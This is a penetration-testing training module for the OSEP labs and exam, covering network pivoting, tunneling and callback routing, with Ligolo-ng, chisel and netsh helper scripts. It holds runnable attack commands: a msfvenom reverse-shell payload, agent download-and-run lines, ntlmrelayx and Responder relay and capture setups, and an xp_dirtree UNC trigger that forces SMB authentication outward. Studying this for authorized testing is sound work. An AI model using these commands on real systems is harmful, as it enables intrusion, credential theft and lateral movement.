::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Pivoting and tunneling

Forward reachability and target-initiated callbacks are two different paths — design them separately. Do not put Kali's `LHOST` into a payload, UNC path, or auth-callback address just because SOCKS already works. The target → Kali path may not exist; that mistake burns the most time.

Reserve ports up front (see [00-environment-and-infra](/modules/00-environment-and-infra): 11601 = Ligolo proxy, 1080 = SOCKS, 8081 = example internal web). After any parameter change, verify with a harmless connect — never assume.

## Decide the direction first

| Type | Who listens | Who initiates | Typical command | Solves |
|---|---|---|---|---|
| Local forward `-L` | Local (Kali) | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali needs an internal service |
| Dynamic / SOCKS `-D` | Local (Kali) | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf `socks_proxy` | Arbitrary tools via proxy into the internal net |
| Remote / reverse forward `-R` / listener | Host reachable from the target (pivot / agent) | Target initiates | ligolo `listener_add`, netsh portproxy, `ssh -R` | Target-initiated callbacks (reverse shell, NTLM auth) |
| Ligolo full subnet | Your Kali (tun iface) | Kali | `ip route add 172.16.X.0/24 dev ligolo` | Whole internal range as if local |

A SOCKS proxy only carries connections **initiated by Kali**. When a target process (SQL `xp_dirtree`, reverse shell, auth callback) connects, it uses the **target's own routing** — SOCKS cannot help. Open a receive port on a host the target can reach, then tunnel that connection back to the Kali listener.

## Internal site only accepts a specified subnet

If Kali's direct connect is refused (ACL only allows a given subnet) but a controlled DEV host can reach the site, bring the pivot's reachability back to Kali with local or dynamic forwarding. Afterward every payload address must follow the **same callback path as the pivot**. The web host behind upload or RCE may not be able to call Kali — put the receive port where that host can reach (usually the DEV host).

- [ ] Confirm DEV actually reaches the internal site, and whether DEV can egress to Kali
- [ ] Build Kali → DEV forwarding (SSH `-L`/`-D`, Ligolo, or chisel — pick by what you have)
- [ ] Hit the site over the working path and keep all later upload / RCE on that path
- [ ] Open a receive port on DEV and set payload `LHOST` to the DEV internal IP, never Kali
- [ ] Harmless-callback test before the real payload

```bash
# Pre-reserve: local 8081 (forward port), 1080 (SOCKS), 11601 (ligolo)
mkdir -p ~/osep/tools ~/osep/logs
# Binaries under ~/osep/tools: ligolo_proxy_linux / ligolo_agent_windows.exe / chisel / sshuttle
# (see m08-*-setup.sh dependency notes)
```

Confirm the pivot egress (this decides how you build the callback direction):

```bash
# On DEV, confirm it really reaches the internal site (in an existing shell / tunnel)
curl -s -o /dev/null -w '%{http_code}\n' http://172.16.X.50:8081/
# Confirm DEV → Kali egress (this decides how you build the callback direction)
```

If DEV has SSH, local forward and a dynamic proxy together is the simplest path:

```bash
ssh -N -L 127.0.0.1:8081:172.16.X.50:8081 -D 1080 USER@DEV_IP
# Browser/tools: http://127.0.0.1:8081 (local forward); other internal probes via 127.0.0.1:1080 SOCKS
```

If DEV can run a Ligolo agent (Windows or Linux), use `m08-ligolo-ng-setup.sh`:

```bash
# Kali: proxy + tun + route (script subcommands proxy / route)
sudo ip route add 172.16.X.0/24 dev ligolo
# proxy console: session → start; then Kali hits http://172.16.X.50:8081 directly
```

If the internal site runs on DEV itself, use Ligolo's local-forward IP — no full subnet route needed:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV loopback
curl http://240.0.0.1:8081/
```

If DEV can run a chisel client, use `m08-chisel-socks.sh`.

Verify the site over the path you just built, and stay on it:

```bash
curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # expect 200/302
# All later upload/RCE interaction stays on this working path — do not switch back to Kali's direct address
```

After execution on the web side, the callback target is a **receive port you open on DEV**, forwarded through the tunnel to the Kali listener. Ligolo reverse-listener template:

```
# Kali terminal 1: real shell listener
rlwrap -cAr nc -lvnp 4444
# Kali terminal 2 (ligolo proxy console): agent(DEV) listens 0.0.0.0:PORT, forwards to Kali 127.0.0.1:4444
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4444 --tcp
listener_list
# Generated payload LHOST=DEV internal IP, LPORT=4445 (never Kali IP)
#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<DEV_IP> LPORT=4445 -f exe -o rev.exe
# After web-side exec: web host → DEV:4445 → ligolo tunnel → Kali 127.0.0.1:4444
```

A Windows DEV pivot can also use `m08-port-forward.ps1` portproxy for the equivalent forward.

Verify: `curl` to `http://127.0.0.1:8081/` is not refused; a harmless callback from the web entry (`nc <DEV_IP> 4445` or one download) completes the chain; after the reverse shell, `whoami` and `ipconfig /all` show the **web host**, not the pivot.

If local 8081 is already in use, switch to `127.0.0.1:18081` and update the URL — do not steal 11601 or 1080. If SSH is unavailable, switch to Ligolo or chisel; as long as DEV can run an agent, you do not need an SSH service. If the site is still unreachable, `curl` from DEV first to prove the ACL; it may be port- or protocol-specific — try HTTP → HTTPS or another target port. If the callback never reaches DEV:4445, harmless TCP first (web-side `nc` or a `ping`) to confirm web → DEV; if that fails, place another agent or listener in the same DEV subnet as a relay.

Ligolo `-selfcert` (cleartext channel) is fine for the exam; do not burn time on certs, and do not claim encryption in a report. One listener per forward port; confirm with `listener_list` / `ss -tlnp` that nothing is double-bound. Harmless verify before the real payload — a missed check in a forward chain stacks errors.

::: details `m08-ligolo-ng-setup.sh` · click to expand

````bash
#!/usr/bin/env bash
# Purpose: Ligolo-ng end-to-end helper — start proxy, tun/route, agent delivery, reverse forward, file transfer, double pivot
# Scenario: M08 scenarios 34/35 (internal ACL forward, target-initiated callback sink) — see docs/08-pivoting-tunneling.md
# Depends: ligolo_proxy_linux / ligolo_agent under ~/osep/tools, sudo (ip tuntap/route), python3 (http.server delivery)
# Usage: bash m08-ligolo-ng-setup.sh <subcommand> [args]
#       proxy            [PORT]              # create tun iface and start proxy (-selfcert)
#       agent            [LHOST] [PORT]      # Kali HTTP delivery + print target download/run commands
#       route            NETWORK[/24]        # full subnet route (e.g. 172.16.40.0/24)
#       route-local                          # 240.0.0.1/32 → agent host loopback (site on agent itself)
#       reverse          AGENT_PORT KALI_PORT# target-initiated callback: print listener_add + payload address template
#       file             AGENT_PORT KALI_PORT FILE  # send a Kali file to the target via the tunnel
#       double           SECOND_TUN NETWORK  # second tun + forward 11601 (double pivot)
# Placeholders: LHOST=attacker-reachable IP; PORT=proxy port (default 11601); AGENT_PORT=agent-side receive; KALI_PORT=Kali listener
# Test status: passed bash -n (no ligolo binary / no tun rights here — not runtime-tested); interactive commands must be run by hand in the proxy console
set -euo pipefail

TOOLS="${HOME}/osep/tools"
PROXY_BIN="${TOOLS}/ligolo_proxy_linux"
AGENT_BIN="${TOOLS}/ligolo_agent_windows.exe"
TUN="ligolo"
KALI_PORT_DEFAULT=11601

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,17p' "$0" | sed 's/^# //'; exit 1; }

ensure_bin(){ [[ -x "$1" ]] || { warn "missing $1 — download and chmod +x first (under ~/osep/tools)"; exit 1; }; }

# Create / bring up tun iface
tun_up(){
  local name="$1" user; user="$(id -un)"
  sudo ip tuntap add user "$user" mode tun "$name" 2>/dev/null || true   # ignore if already exists
  sudo ip link set "$name" up
  ip link show "$name" >/dev/null 2>&1 || { warn "tun iface $name not ready"; exit 1; }
}

cmd_proxy(){
  local port="${1:-$KALI_PORT_DEFAULT}"
  ensure_bin "$PROXY_BIN"
  tun_up "$TUN"
  say "starting Ligolo proxy (-selfcert, cleartext channel — enough for exam), port $port"
  say "then in proxy console:  session → start"
  [[ "$port" != "$KALI_PORT_DEFAULT" ]] && info "agent connect port must match $port"
  "$PROXY_BIN" -selfcert -port "$port"
}

cmd_agent(){
  local lhost="${1:-}"; local port="${2:-$KALI_PORT_DEFAULT}"
  [[ -z "$lhost" ]] && { warn "usage: $0 agent LHOST [PORT]"; exit 1; }
  [[ -f "$AGENT_BIN" ]] || { warn "missing $AGENT_BIN"; exit 1; }
  (cd "$TOOLS" && python3 -m http.server 80) &   # delivery dir = ~/osep/tools
  say "HTTP delivery on port 80 (logs follow this terminal)"
  say "on target (PowerShell) run:"
  info "iwr -uri http://${lhost}/ligolo_agent_windows.exe -UseBasicParsing -OutFile ligolo_agent.exe"
  info ".\ligolo_agent.exe -connect ${lhost}:${port} -ignore-cert"
  say "after agent checks in, proxy console:  session → start"
}

cmd_route(){
  local net="${1:-}"; [[ -z "$net" ]] && { warn "usage: $0 route NETWORK/24"; exit 1; }
  tun_up "$TUN"
  sudo ip route add "$net" dev "$TUN" 2>/dev/null || true
  say "route added (repeat is ignored): $net dev $TUN"
  info "verify: ip route list | grep $TUN"
  say "back in proxy console confirm session is started — then Kali can hit that subnet directly"
}

cmd_route_local(){
  tun_up "$TUN"
  sudo ip route add 240.0.0.1/32 dev "$TUN" 2>/dev/null || true
  say "240.0.0.1/32 → agent host loopback (Ligolo local port-forward special IP)"
  info "when the site is on the agent host: curl http://240.0.0.1:8081/ or nmap 240.0.0.1 -sV"
}

cmd_reverse(){
  local agent_port="${1:-}"; local kali_port="${2:-}"
  [[ -z "$agent_port" || -z "$kali_port" ]] && { warn "usage: $0 reverse AGENT_PORT KALI_PORT"; exit 1; }
  say "target-initiated callback template (scenario 35 sink) — start the real Kali listener first:"
  info "rlwrap -cAr nc -lvnp ${kali_port}"
  say "then in proxy console (agent listens 0.0.0.0:AGENT_PORT, forwards to Kali 127.0.0.1:KALI_PORT):"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  info "listener_list"
  say "addresses in payload/trigger params = agent host internal IP + ${agent_port} (never Kali public IP):"
  info "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AGENT_IP> LPORT=${agent_port} -f exe -o rev.exe"
}

cmd_file(){
  local agent_port="${1:-}"; local kali_port="${2:-}"; local fname="${3:-}"
  [[ -z "$fname" ]] && { warn "usage: $0 file AGENT_PORT KALI_PORT FILE"; exit 1; }
  say "in proxy console run:"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  say "on Kali serve the file (from its directory):"
  info "python3 -m http.server ${kali_port}"
  say "on target download (IP in URL = agent host internal IP):"
  info "Invoke-WebRequest -Uri \"http://<AGENT_IP>:${agent_port}/${fname}\" -OutFile ${fname}"
}

cmd_double(){
  local tun2="${1:-ligolo_double}"; local net2="${2:-}"
  [[ -z "$net2" ]] && { warn "usage: $0 double SECOND_TUN NETWORK/24"; exit 1; }
  say "double pivot (second agent joins via first hop)"
  tun_up "$tun2"
  say "1) proxy console (inside first-hop session):"
  info "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp"
  info "listener_list"
  say "2) second target agent connect address = first-hop agent host IP:"
  info "ligolo_agent.exe -connect <FIRST_PIVOT_IP>:11601 -ignore-cert"
  say "3) after second-hop session is up: session (switch to second hop) → start; Kali adds second-layer route:"
  info "sudo ip route add ${net2} dev ${tun2}"
  info "ip route list | grep ${tun2}"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  proxy)  shift; cmd_proxy "$@";;
  agent)  shift; cmd_agent "$@";;
  route)  shift; cmd_route "$@";;
  route-local) cmd_route_local;;
  reverse) shift; cmd_reverse "$@";;
  file)   shift; cmd_file "$@";;
  double) shift; cmd_double "$@";;
  *) usage;;
esac
````

:::
::: details `m08-chisel-socks.sh` · click to expand

````bash
#!/usr/bin/env bash
# Purpose: chisel tunnel fallback (SOCKS / single-service forward / reverse sink when Ligolo unavailable) + proxychains helper
# Scenario: M08 scenario 34 (internal web via pivot) and 35 (target-initiated callback sink) — see docs/08-pivoting-tunneling.md
# Depends: chisel (Kali ~/osep/tools/chisel Linux build; Windows build delivered to target), sudo (to edit /etc/proxychains4.conf)
# Usage: bash m08-chisel-socks.sh <subcommand> [args]
#       server            [PORT]              # Kali chisel server --reverse (default 8080)
#       client-socks      SERVER_ADDR         # print target cmd: R:1080:socks → Kali 127.0.0.1:1080 egress is the target
#       client-forward    SERVER_ADDR LKALI TARGET TPORT  # print target cmd: Kali local LKALI → TARGET:TPORT
#       rev-serve         [PORT]              # scenario 35: start chisel server on a target-reachable host (receive side)
#       rev-client        PIVOT_ADDR PORT KALI_PORT  # scenario 35: Kali client R:PORT:127.0.0.1:KALI_PORT
#       proxychains                             # append socks5 line to /etc/proxychains4.conf and show usage
# Placeholders: SERVER_ADDR=Kali chisel server (IP:PORT); PIVOT_ADDR=scenario-35 receive-side host
# Test status: passed bash -n (no chisel here — not runtime-tested); for chisel R: the listener is on the server side, egress on the client side
set -euo pipefail

TOOLS="${HOME}/osep/tools"
CHISEL="${TOOLS}/chisel"

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,15p' "$0" | sed 's/^# //'; exit 1; }

# Topology (memorize before acting — wrong direction = no tunnel):
#   L:xx listens on the chisel client; R:xx listens on the chisel server.
#   R: egress is on the client side — so when Kali is server and the target is client,
#   R:socks / R:PORT:TARGET:PORT gives Kali usable ports with traffic exiting from the target.

cmd_server(){
  local port="${1:-8080}"
  [[ -x "$CHISEL" ]] || { warn "missing $CHISEL"; exit 1; }
  say "Kali chisel server (--reverse), port $port"
  "$CHISEL" server -p "$port" --reverse
}

cmd_client_socks(){
  local addr="${1:-}"; [[ -z "$addr" ]] && { warn "usage: $0 client-socks KALI_SERVER:PORT"; exit 1; }
  say "on target (target must egress to ${addr}):"
  info "chisel.exe client ${addr} R:1080:socks"
  say "on Kali, proxychains via 127.0.0.1:1080 into the internal net (egress = target):"
  info "bash $0 proxychains    # after auto-writing socks5 config:"
  info "proxychains4 -q netexec mssql targets.txt -u 'USER' -p 'PASS'"
}

cmd_client_forward(){
  local addr="${1:-}"; local lport="${2:-}"; local target="${3:-}"; local tport="${4:-}"
  [[ -z "$tport" ]] && { warn "usage: $0 client-forward KALI_SERVER:PORT KALI_LPORT TARGET TPORT"; exit 1; }
  say "on target (Kali hits 127.0.0.1:${lport} → ${target}:${tport}, scenario 34 single-service forward):"
  info "chisel.exe client ${addr} R:${lport}:${target}:${tport}"
  say "Kali verify:"
  info "curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:${lport}/"
}

cmd_rev_serve(){
  local port="${1:-9310}"
  say "scenario 35 receive side: on the [host the target can reach] (e.g. internal pivot) start chisel server:"
  info "./chisel server -p ${port}"
  say "ensure that host is reachable from the target (same subnet / firewall allows ${port})"
}

cmd_rev_client(){
  local paddr="${1:-}"; local lport="${2:-}"; local kport="${3:-}"
  [[ -z "$kport" ]] && { warn "usage: $0 rev-client PIVOT_ADDR LISTENPORT KALI_PORT"; exit 1; }
  say "on Kali first start the auth/callback sink (root; stop smbd before binding 445):"
  info "sudo ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'     # listen ${kport}"
  say "on Kali run (client connects to receive host; R: makes that host listen on ${lport} and forward to Kali ${kport}):"
  info "$CHISEL client ${paddr} R:${lport}:127.0.0.1:${kport}"
  say "trigger-parameter address = receive-host internal IP:${lport} (e.g. SQL: EXEC master..xp_dirtree '\\\\<PIVOT_IP>\\share')"
}

cmd_proxychains(){
  local conf="/etc/proxychains4.conf"
  sudo test -w "$conf" || { warn "need sudo to write $conf"; exit 1; }
  if ! grep -qs '^socks[45][[:space:]]*127\.0\.0\.1[[:space:]]*1080' "$conf"; then
    echo "socks5 127.0.0.1 1080" | sudo tee -a "$conf" >/dev/null
    say "wrote: socks5 127.0.0.1 1080 (comment out older proxy lines first if present)"
  else
    say "$conf already has a socks line for 127.0.0.1:1080 — skipped"
  fi
  say "usage examples:"
  info "proxychains4 -q netexec smb 172.16.X.0/24 -u USER -p PASS"
  info "proxychains4 -q curl http://172.16.X.50:8081/"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  server)         shift; cmd_server "$@";;
  client-socks)   shift; cmd_client_socks "$@";;
  client-forward) shift; cmd_client_forward "$@";;
  rev-serve)      shift; cmd_rev_serve "$@";;
  rev-client)     shift; cmd_rev_client "$@";;
  proxychains)    cmd_proxychains;;
  *) usage;;
esac
````

:::
::: details `m08-port-forward.ps1` · click to expand

````powershell
<#
Purpose: Forward helper on a Windows pivot — netsh portproxy (forward/sink) and ssh -L/-R tunnels, with firewall allow and cleanup
Scenario: M08 scenario 34 (pivot exposes an internal site/service) and 35 (open a receive port on the pivot back to Kali’s auth listener) — see docs/08-pivoting-tunneling.md
Depends: PowerShell 3+; netsh portproxy needs admin; ssh tunnels need OpenSSH client (ssh.exe) on the host
Usage: powershell -ep bypass -f m08-port-forward.ps1 -Mode Add -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081
       powershell -ep bypass -f m08-port-forward.ps1 -Mode Remove -ListenPort 8081
       powershell -ep bypass -f m08-port-forward.ps1 -Mode Show
       powershell -ep bypass -f m08-port-forward.ps1 -Mode SshTunnel -Forward Local -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081 -SshUser root -SshHost 10.10.14.5 -SshKey ~/.ssh/id_rsa
       Scenario 35 example (sink on pivot toward Kali): -Mode Add -ListenAddress <PIVOT_IP> -ListenPort 445 -ConnectAddress <KALI_IP> -ConnectPort 445
Placeholders: PIVOT_IP=pivot internal IP; KALI_IP=attacker-reachable IP; TARGET/TARGET_PORT=final internal service
Test status: Not run on Windows (host is macOS); netsh args and common failure branches checked by hand
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet('Add', 'Remove', 'Show', 'SshTunnel')][string]$Mode,
    [string]$ListenAddress = "0.0.0.0",          # portproxy listen address (default all interfaces)
    [int]$ListenPort = 0,                        # port opened on the pivot (required for Add/SshTunnel)
    [string]$ConnectAddress = "",                # forward target (Add: internal service IP; scenario 35: Kali IP)
    [int]$ConnectPort = 0,
    [ValidateSet('Local', 'Remote')][string]$Forward = 'Local',  # ssh -L / -R
    [string]$SshHost = "", [string]$SshUser = "", [string]$SshKey = "",
    [switch]$AddFirewallRule,
    [switch]$RemoveFirewallRule
)

function Show-ErrorAndExit($msg) { Write-Error $msg; exit 1 }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

switch ($Mode) {
    'Add' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin (re-run from an elevated window)" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0) {
            Show-ErrorAndExit "Add needs -ListenPort / -ConnectAddress / -ConnectPort"
        }
        # Clear same binding first to avoid duplicate-add errors
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        netsh interface portproxy add v4tov4 listenport=$ListenPort listenaddress=$ListenAddress `
            connectport=$ConnectPort connectaddress=$ConnectAddress
        if ($LASTEXITCODE -ne 0) { Show-ErrorAndExit "portproxy add failed (exit $LASTEXITCODE)" }
        Write-Output "[+] portproxy: $ListenAddress`:$ListenPort -> $ConnectAddress`:$ConnectPort"
        if ($AddFirewallRule) {
            netsh advfirewall firewall add rule name="fp-in-$ListenPort" dir=in action=allow `
                protocol=TCP localport=$ListenPort | Out-Null
            Write-Output "[+] allowed inbound TCP $ListenPort (rule name fp-in-$ListenPort)"
        }
        Write-Output "[i] verify: netsh interface portproxy show all ; rollback: $PSCommandPath -Mode Remove -ListenPort $ListenPort"
    }
    'Remove' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin" }
        if ($ListenPort -le 0) { Show-ErrorAndExit "Remove needs -ListenPort" }
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        Write-Output "[-] removed portproxy $ListenAddress`:$ListenPort"
        if ($RemoveFirewallRule) {
            netsh advfirewall firewall delete rule name="fp-in-$ListenPort" | Out-Null
            Write-Output "[-] removed firewall rule fp-in-$ListenPort"
        }
    }
    'Show' {
        netsh interface portproxy show all
        Write-Output "`n[i] IPv4 forward rules above; connections/occupancy: netstat -ano | findstr LISTENING"
    }
    'SshTunnel' {
        $ssh = Get-Command ssh.exe -ErrorAction SilentlyContinue
        if (-not $ssh) { Show-ErrorAndExit "ssh.exe not found — without OpenSSH client use -Mode Add (netsh)" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0 -or -not $SshHost -or -not $SshUser) {
            Show-ErrorAndExit "SshTunnel needs -ListenPort / -ConnectAddress / -ConnectPort / -SshHost / -SshUser"
        }
        $sshArgs = @('-N')
        # Local (-L): local ListenPort -> ConnectAddress:ConnectPort (scenario 34); Remote (-R): remote listen -> local
        # Note: ssh -R binds remote loopback by default; remote sshd needs GatewayPorts for other hosts to connect (see docs/08 scenario 35 fallback)
        $spec = if ($Forward -eq 'Local') {
            "127.0.0.1:$ListenPort`:$ConnectAddress`:$ConnectPort"
        } else {
            "0.0.0.0:$ListenPort`:$ConnectAddress`:$ConnectPort"
        }
        $flag = if ($Forward -eq 'Local') { '-L' } else { '-R' }
        $sshArgs += @($flag, $spec)
        if ($SshKey) { $sshArgs += @('-i', $SshKey) }
        $sshArgs += @('-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30')
        $sshArgs += "$($SshUser)@$SshHost"
        Write-Output "[i] running: ssh $($sshArgs -join ' ')   (Ctrl+C to drop the tunnel)"
        & $ssh.Source $sshArgs
    }
}
````

:::
## Target-initiated callback never hits the listener

If SOCKS already reaches internal SQL or domain services but a target-initiated connect (SQL auth / relay, NTLM callback) never arrives, the two paths are different. Put the receive point where the **target can reach** (pivot / agent host), then forward back to the Kali listener.

- [ ] Confirm forward access already works (`proxychains` to SQL / domain queries)
- [ ] Confirm the target can reach some same-subnet host, but not Kali
- [ ] Free the Kali listen port and start the auth sink (stop `smbd` before binding 445)
- [ ] Open a reverse forward on the agent / pivot (`listener_add`, portproxy, or `ssh -R`)
- [ ] Put the **agent / pivot internal IP** in the trigger, never Kali
- [ ] Trigger once and confirm the sink sees the target's source IP

```bash
# Kali: auth sink + relay tools ready (run as root; SMB 445 needs privilege)
sudo systemctl stop smbd   # free 445 or responder/ntlmrelayx will not bind
sudo rlwrap responder -I eth0 -A    # or
sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # relay variant
```

Confirm Kali's local listen port (445 / HTTP) matches the tunnel's `--to 127.0.0.1` port.

A working proxychains forward does **not** mean the target can reach Kali. On a target-reachable host, open a temporary listener and trigger one connect from the target side — see whether it arrives.

Prefer Ligolo-ng `listener_add` (direction = reverse forward):

```
# Kali terminal 1: auth sink (real listen on Kali)
sudo ntlmrelayx.py -t smb://<internal-target> -smb2support ...    # listen 0.0.0.0:445
# Kali terminal 2 (ligolo proxy console): agent listens 0.0.0.0:445 on the target side → forward to Kali 127.0.0.1:445
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
listener_list
```

Address in trigger params = agent host (the IP the target can reach), not Kali:

```sql
-- On target SQL, trigger outbound SMB auth (example: UNC directory listing)
EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
-- or xp_subdirs / xp_fileexist; low-priv SQL can often still trigger (see [11-mssql](/modules/11-mssql))
```

Auth packet path: target → `<AGENT_INTERNAL_IP>:445` → Ligolo tunnel → Kali `127.0.0.1:445` (ntlmrelayx / responder). Arrival means relay or capture the hash.

Windows pivot alternative (netsh portproxy, when the pivot can egress to Kali):

```powershell
# On Windows pivot (admin): listen pivot 445 → forward to Kali ntlmrelayx
netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
# Trigger params become \\<PIVOT_IP>\share; verify: netsh interface portproxy show all
```

Requires: pivot → Kali:445 egress allowed (agent / beacon egress usually implies this); target → pivot:445 allowed. Use `m08-port-forward.ps1` for add / show / rollback.

Linux pivot fallback (`ssh -R`; sshd must allow an external bind):

```bash
# Run from Kali; bind pivot 0.0.0.0:445, forward to Kali 127.0.0.1:445
ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
# sshd needs GatewayPorts clientspecified/yes; otherwise -R binds loopback only and the target cannot connect — confirm before relying on it
```

Trigger-side templates: [11-mssql](/modules/11-mssql) and [16-ics-calendar](/modules/16-ics-calendar). The Ligolo `reverse` subcommand prints the standard reverse-forward template.

Verify: `listener_list` shows the listener; `ss -tlnp` shows 445 / the target port really listening on Kali. After the trigger, ntlmrelayx / responder prints the auth source IP — should be the **target / relay party**, not Kali itself. Relay success is a command or session on the target host; if you are only capturing hashes, confirm the format matches your cracker.

If still no auth arrives, go back to a temporary `nc -lvnp` on a target-reachable host, trigger one TCP connect, and decide "path broken" vs "trigger params ineffective" — change one variable at a time. If 445 is occupied or the bind fails, `sudo systemctl stop smbd` on Kali first; a non-privileged `--to` port (e.g. 4455) can sink a test connect, but SMB auth itself must be 445 — if relaying to 445 is constrained, switch to ntlmrelayx HTTP relay or responder capture, then crack or replay the hash. If the target can only reach local loopback (SQL and the pivot are the same host), place the agent on the target itself and trigger `127.0.0.1` (`--addr 0.0.0.0:445` is local). If Ligolo is unavailable, pick among chisel / netsh portproxy / `ssh -R` whichever matches "target can reach".

Trigger auth **once** — confirm the listener is up before each attempt. SMB / HTTP relay needs the target and relay on the same subnet with SMB signing off (probe first); EPA / signing conditions: [12-ad-attacks](/modules/12-ad-attacks) ESC8 and [16-ics-calendar](/modules/16-ics-calendar). Write down both values and reuse them: the IP in trigger params is always "the host the target can reach"; the port is always "the tunnel port opened on that target-side host".

## Cheat sheet

| Need | First choice | Fallback | Notes |
|---|---|---|---|
| Hit one internal web | ssh `-L` (pivot has SSH) | ligolo `240.0.0.1` / chisel `R:` | avoid port clashes with 11601 / 1080 |
| Whole internal range like local | Ligolo-ng full subnet route | sshuttle (pivot has SSH, needs root) | sshuttle weak on ICMP / UDP |
| Arbitrary tools via proxy | proxychains + SOCKS (msf `socks_proxy` / chisel `R:socks` / ssh `-D`) | add `socks5 127.0.0.1 1080` to `proxychains4` | confirm the trailing proxy line in `/etc/proxychains4.conf` |
| Target-initiated callback sink | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | receive side always where the target can reach |
| Metasploit in-session routing | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route` / `route flush` | SESSION platform mismatch warnings are usually harmless |
| Double pivot (third layer) | Ligolo second tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | recurse the same pattern | one tun iface per layer — do not reuse |

Metasploit:

```
msf6 > use post/multi/manage/autoroute      # set SESSION / SUBNET / NETMASK
msf6 > use auxiliary/server/socks_proxy     # set SRVHOST 127.0.0.1 / SRVPORT 1080 / VERSION 4a
```

sshuttle (when the pivot has SSH — more stable than proxychains for transparent internal web):

```bash
sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
# then curl http://172.16.X.50:8081/ directly — no proxy prefix
```

Related: [00-environment-and-infra](/modules/00-environment-and-infra) (port plan), [11-mssql](/modules/11-mssql) (`xp_dirtree` triggers), [16-ics-calendar](/modules/16-ics-calendar), [09-c2-egress-channels](/modules/09-c2-egress-channels) (same path for every stage).
